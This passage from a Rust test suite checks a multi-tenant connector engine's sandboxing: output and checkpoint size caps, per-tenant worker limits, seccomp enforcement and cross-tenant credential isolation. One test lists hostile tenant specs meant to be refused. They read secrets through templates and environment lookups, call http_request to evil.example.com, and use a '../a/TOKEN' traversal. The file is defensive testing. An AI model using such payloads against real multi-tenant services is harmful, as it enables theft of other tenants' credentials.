        "limits: {{ max_response_bytes: 1048576 }}\nstreams:\n  - id: s\n    request: {{ url: \"https://api.example.com/v1/x\" }}\n    program: |\n      s = \"xxxxxxxxxxxxxxxx\"\n      {}{{\"events\": [s]}}\n",
        (0..18).map(|_| "s = s + s\n      ").collect::<String>()
    )));
    let r = run(&h, &s, input()).await;
    assert!(matches!(r.out, Err(EngineError::Vrl(VrlError::OutputTooLarge(_)))), "{:?}", r.out.as_ref().err());

    // The host is unaffected.
    let s = spec(&collector("streams:\n  - id: s\n    request: { url: \"https://api.example.com/v1/x\" }\n    response: { events_path: items }\n"));
    assert_eq!(run(&h, &s, input()).await.out.expect("healthy").events, 1);
}

#[tokio::test]
async fn oversized_state_and_checkpoints_are_refused() {
    let mock = start_mock(Arc::new(|_r| MockResp::json(json!({"items": [1]}))), false).await;
    let h = harness(&mock);
    let s = spec(&collector(&format!(
        "limits: {{ max_checkpoint_bytes: 1048576 }}\nstreams:\n  - id: s\n    request: {{ url: \"https://api.example.com/v1/x\" }}\n    program: |\n      s = \"xxxxxxxxxxxxxxxx\"\n      {}{{\"events\": [1], \"state\": {{\"blob\": s}}}}\n",
        (0..17).map(|_| "s = s + s\n      ").collect::<String>()
    )));
    let r = run(&h, &s, input()).await;
    assert!(matches!(&r.out, Err(EngineError::Cap(m)) if m.contains("checkpoint")), "{:?}", r.out.as_ref().err());
    // Only the stream's activation record (NAN-3697) may have been saved.
    assert!(r.store.saves.lock().unwrap().iter().all(|(_, cp)| cp.pointer("/state/blob").is_none()), "an oversized checkpoint was persisted");
    // The spec cannot raise the ceiling.
    let s = spec(&collector("limits: { max_checkpoint_bytes: 999999999999 }\nstreams:\n  - id: s\n    request: { url: \"https://api.example.com/v1/x\" }\n"));
    let c = nano_connector::engine::compile(&s, &h.cfg.ceilings).unwrap();
    assert_eq!(c.limits.max_checkpoint_bytes, 16 * 1024 * 1024);
    // Nor remember unbounded uids.
    let s = spec(&collector(
        "streams:\n  - id: s\n    request: { url: \"https://api.example.com/v1/x\" }\n    window: { max_span_secs: 3600, uid_field: id, time_field: t, max_seen: 100000000 }\n",
    ));
    assert!(matches!(nano_connector::engine::compile(&s, &h.cfg.ceilings), Err(EngineError::Spec(_))));
}

#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn one_tenant_cannot_take_every_vrl_worker() {
    // Run a holds tenant a's only worker slot while its request hangs for
    // 2.5 s (an async delay: the mock's runtime keeps serving). Runs b and c
    // start only once a's request reached the vendor, so a provably holds
    // its reservation for all of b's 400 ms wait.
    let slow_seen = Arc::new(tokio::sync::Notify::new());
    let seen2 = slow_seen.clone();
    let mock = start_mock(
        Arc::new(move |r| {
            if r.path == "/v1/slow" {
                seen2.notify_one();
                return MockResp::json(json!({"items": [1]})).delay(Duration::from_millis(2500));
            }
            MockResp::json(json!({"items": [1]}))
        }),
        false,
    )
    .await;
    let mut h = harness(&mock);
    h.cfg.vrl_pool = Arc::new(VrlPool::new(
        worker_exe(),
        require_seccomp(),
        PoolConfig { max_workers: 4, max_per_tenant: 1, acquire_timeout: Duration::from_millis(400) },
    ));
    let prog = |p: &str| spec(&collector(&format!("streams:\n  - id: s\n    request: {{ url: \"https://api.example.com/v1/{p}\" }}\n    program: '{{\"events\": .response.body.items}}'\n")));
    let tenant = |t: &str| RunInput { tenant: Some(t.into()), ..input() };
    let slow = prog("slow");
    let fast = prog("fast");
    let (a, (b, c)) = tokio::join!(run(&h, &slow, tenant("a")), async {
        // a's request reached the vendor, so a holds its reservation.
        slow_seen.notified().await;
        tokio::join!(run(&h, &fast, tenant("a")), run(&h, &fast, tenant("b")))
    });
    assert_eq!(a.out.expect("tenant a, first run").events, 1);
    assert!(matches!(b.out, Err(EngineError::Vrl(VrlError::PoolExhausted(..)))), "{:?}", b.out.as_ref().err());
    assert_eq!(c.out.expect("tenant b is not starved").events, 1);
    // A spec needing more workers than a tenant may hold is refused up front.
    let two = spec(&collector(
        "streams:\n  - id: s1\n    request: { url: \"https://api.example.com/v1/a\" }\n    program: '{\"events\": []}'\n  - id: s2\n    request: { url: \"https://api.example.com/v1/b\" }\n    program: '{\"events\": []}'\n",
    ));
    assert!(matches!(run(&h, &two, tenant("c")).await.out, Err(EngineError::Spec(_))));
}

// ---------------------------------------------------------------------------
// Cross-tenant
// ---------------------------------------------------------------------------

#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn hostile_spec_cannot_reach_another_tenants_credentials() {
    // The platform's own secrets live in the host environment.
    // SAFETY: test-only; no other thread reads this variable concurrently.
    unsafe { std::env::set_var("NANO_TEST_PLATFORM_SECRET", SECRET_B) };
    let mock = start_mock(
        Arc::new(|r| {
            let resp = MockResp::json(json!({"items": [{"seen_auth": r.headers.get("authorization")}]}));
            if r.path == "/v1/slow" { resp.delay(Duration::from_millis(500)) } else { resp }
        }),
        false,
    )
    .await;
    let h = harness(&mock);
    let tenant_a = RunInput { tenant: Some("a".into()), credentials: creds(&[("TOKEN", SECRET)]), ..Default::default() };
    let victim = spec(&collector("streams:\n  - id: s\n    request: { url: \"https://api.example.com/v1/slow\" }\n    response: { events_path: items }\n"));

    // Tenant B's hostile specs, each run concurrently with tenant A's run.
    let hostile: Vec<(&str, String)> = vec![
        ("template credentials", collector("streams:\n  - id: s\n    request: { url: \"https://api.example.com/v1/x\", query: { k: \"{{credentials.TOKEN}}\" } }\n")),
        ("template config of another tenant", collector("streams:\n  - id: s\n    request: { url: \"https://api.example.com/v1/x\", query: { k: \"{{config.TOKEN}}\" } }\n    response: { events_path: items }\n")),
        ("VRL env", collector("streams:\n  - id: s\n    request: { url: \"https://api.example.com/v1/x\" }\n    program: '{\"events\": [get_env_var!(\"NANO_TEST_PLATFORM_SECRET\")]}'\n")),
        ("VRL secrets store", collector("streams:\n  - id: s\n    request: { url: \"https://api.example.com/v1/x\" }\n    program: '{\"events\": [get_secret(\"TOKEN\")]}'\n")),
        ("VRL host lookups", collector("streams:\n  - id: s\n    request: { url: \"https://api.example.com/v1/x\" }\n    program: '{\"events\": [get_hostname!(), dns_lookup!(\"x\"), reverse_dns!(\"1.1.1.1\")]}'\n")),
        ("VRL http", collector("streams:\n  - id: s\n    request: { url: \"https://api.example.com/v1/x\" }\n    program: '{\"events\": [http_request!(\"https://evil.example.com\")]}'\n")),
        ("auth names another credential", collector("streams:\n  - id: s\n    request: { url: \"https://api.example.com/v1/x\" }\n").replace("credential: TOKEN", "credential: \"../a/TOKEN\"")),
    ];
    for (name, yaml) in hostile {
        let tenant_b = RunInput { tenant: Some("b".into()), credentials: creds(&[("TOKEN", SECRET_B)]), ..Default::default() };
        let hostile_spec = spec(&yaml);
        let (ra, rb) = tokio::join!(run(&h, &victim, clone_input(&tenant_a)), run(&h, &hostile_spec, tenant_b));
        assert_eq!(ra.out.as_ref().expect("tenant A unaffected").events, 1);
        let leaked = format!("{:?} {:?} {:?}", rb.out.as_ref().map(|o| &o.checkpoints), rb.sink.events(), rb.store.saves.lock().unwrap());
        assert!(!leaked.contains(SECRET) && !secrets().contains_str(&leaked), "{name}: B saw A's or the platform's secret: {leaked}");
        if let Err(e) = &rb.out {
            assert!(!e.to_string().contains(SECRET), "{name}: error leaks A's secret");
        }
    }
    // Every request carrying A's token was A's own.
    for r in mock.requests() {
        if r.headers.get("authorization").is_some_and(|a| a.contains(SECRET)) {
            assert_eq!(r.path, "/v1/slow", "A's token on someone else's request");
        }
    }
    // SAFETY: as above.
    unsafe { std::env::remove_var("NANO_TEST_PLATFORM_SECRET") };
}

fn clone_input(i: &RunInput) -> RunInput {
    RunInput { tenant: i.tenant.clone(), credentials: i.credentials.clone(), config: i.config.clone(), ..Default::default() }
}

#[tokio::test]
async fn workers_are_single_use_and_strict_mode_is_honoured() {
    let mock = start_mock(Arc::new(|_r| MockResp::json(json!({"items": [1]}))), false).await;
    let h = harness(&mock);
    let s = spec(&collector("streams:\n  - id: s\n    request: { url: \"https://api.example.com/v1/x\" }\n    program: '{\"events\": .response.body.items}'\n"));
    let before = h.cfg.vrl_pool.spawned.load(std::sync::atomic::Ordering::SeqCst);
    for t in ["a", "b", "a"] {
        let r = run(&h, &s, RunInput { tenant: Some(t.into()), ..input() }).await;
        let out = r.out.expect("run");
        let (_, rep) = &out.sandbox[0];
        assert!(rep.rlimits);
        assert_eq!(rep.seccomp, "enforced", "seccomp must be available on Linux test hosts");
    }
    assert_eq!(h.cfg.vrl_pool.spawned.load(std::sync::atomic::Ordering::SeqCst) - before, 3, "one fresh worker per run");

    // Require a cgroup where none is delegated: the run is refused, not
    // silently degraded.
    let strict = SandboxPolicy { cgroup: Enforce::Require, cgroup_parent: None, ..require_seccomp() };
    let mut h2 = harness(&mock);
    h2.cfg.vrl_pool = Arc::new(VrlPool::new(worker_exe(), strict, PoolConfig::default()));
    let r = run(&h2, &s, input()).await;
    assert!(matches!(r.out, Err(EngineError::Vrl(VrlError::Sandbox(_)))), "{:?}", r.out.as_ref().err());
    assert!(mock.requests().len() == 3, "the refused run sent nothing");
    // Prefer: runs, and says so.
    let r = run(&h, &s, input()).await.out.unwrap();
    assert!(r.sandbox[0].1.cgroup.starts_with("unavailable") || r.sandbox[0].1.cgroup.starts_with("enforced"));
    let _ = EngineConfig::new(worker_exe());
}
